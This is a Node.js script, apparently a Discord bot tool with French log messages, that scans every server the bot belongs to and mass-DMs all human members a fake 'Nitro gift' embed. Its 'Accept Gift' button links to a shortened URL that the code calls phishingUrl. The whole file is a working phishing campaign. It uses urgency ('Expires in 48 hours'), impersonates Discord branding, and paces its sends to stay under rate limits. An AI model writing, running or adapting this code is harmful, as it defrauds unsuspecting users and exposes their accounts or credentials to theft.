const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./config.json'));
const token = config.token;

const phishingUrl = "https://tinyurl.com/6c6b86en";
const imageUrl = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";

async function dmAll() {
  console.log("Démarrage du DM ALL...");
  
  let guildsRes = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
    headers: { "Authorization": `Bot ${token}` }
  });
  let guilds = await guildsRes.json();
  
  if (!Array.isArray(guilds)) {
    console.log("Erreur serveurs :", guilds.message);
    return;
  }

  let contacted = new Set();
  let count = 0;

  for (let g of guilds) {
    console.log(`\n--- Scan du serveur : ${g.name} ---`);
    let after = "0";

    while (true) {
      try {
        let res = await fetch(`https://discord.com/api/v9/guilds/${g.id}/members?limit=1000&after=${after}`, {
          headers: { "Authorization": `Bot ${token}` }
        });
        let batch = await res.json();
        
        if (batch.message) { 
          console.log("Erreur membres :", batch.message); 
          break; 
        }
        if (!batch.length) { 
          break; 
        }
        
        for (let m of batch) {
          if (m.user.bot || contacted.has(m.user.id)) continue;
          
          try {
            let dm = await (await fetch(`https://discord.com/api/v9/users/@me/channels`, {
              method: "POST", 
              headers: { "Authorization": `Bot ${token}`, "Content-Type": "application/json" }, 
              body: JSON.stringify({ recipient_id: m.user.id })
            })).json();
            
            if (dm.id) {
              let embed = {
                title: "You've been gifted a subscription!",
                description: `**100pression** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
                color: 0x5865f2,
                image: { url: imageUrl }
              };

              await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages`, {
                method: "POST",
                headers: { "Authorization": `Bot ${token}`, "Content-Type": "application/json" },
                body: JSON.stringify({
                  content: "",
                  embeds: [embed],
                  components: [
                    {
                      type: 1,
                      components: [
                        { type: 2, style: 5, label: "Accept Gift", url: phishingUrl },
                        { type: 2, style: 5, label: "Learn More", url: "https://discord.com/nitro" }
                      ]
                    }
                  ]
                })
              }).catch(() => {});
              
              contacted.add(m.user.id);
              count++;
              console.log(`[${count}] Envoyé à ${m.user.username}`);
            }
          } catch (e) {
            console.log(`Erreur avec ${m.user.username}, on continue...`);
          }
          
          // Pause de 3 secondes pour éviter le rate limit
          await new Promise(r => setTimeout(r, 3000));
        }
        
        after = batch[batch.length - 1].user.id;
        
      } catch (err) {
        console.log("Erreur réseau, pause de 10 secondes...");
        await new Promise(r => setTimeout(r, 10000));
      }
    }
  }
  
  console.log(`\n--- FINI. Total envoyés : ${count} ---`);
}

dmAll();